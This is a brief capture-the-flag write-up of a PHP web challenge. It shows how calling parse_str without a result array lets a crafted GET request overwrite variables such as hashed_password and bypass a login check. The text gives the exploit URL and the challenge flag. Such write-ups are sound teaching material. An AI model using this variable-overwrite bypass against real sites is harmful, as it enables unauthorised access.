This is a warmup web problem.

At line 7:
```
$res = parse_str($query);
```
we see that parse_str function is used without its second parameter, which is the result parameter.
This causes parsed parameters to be saved as variables which are referred to as register globals.

Thus, by sending GET request as: http://simpleauth.chal.ctf.westerns.tokyo?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e,
we are able to set
```
$action = 'auth'
$hashed_password = 'c019f6e5cd8aa0bbbcc6e994a54c757e'
empty($user) == true
empty($pass) == true
```

At line 21~23:
```
if (!empty($user) && !empty($pass)) {
    $hashed_password = hash('md5', $user.$pass);
}
```
Since user and pass are empty, the value of hashed_password is not overwritten with hash() at line 22.

Then, we easily pass the checks at line 24:
```
if (!empty($hashed_password) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') {
```
and gets the flag printed out.

flag: **TWCTF{d0_n0t_use_parse_str_without_result_param}**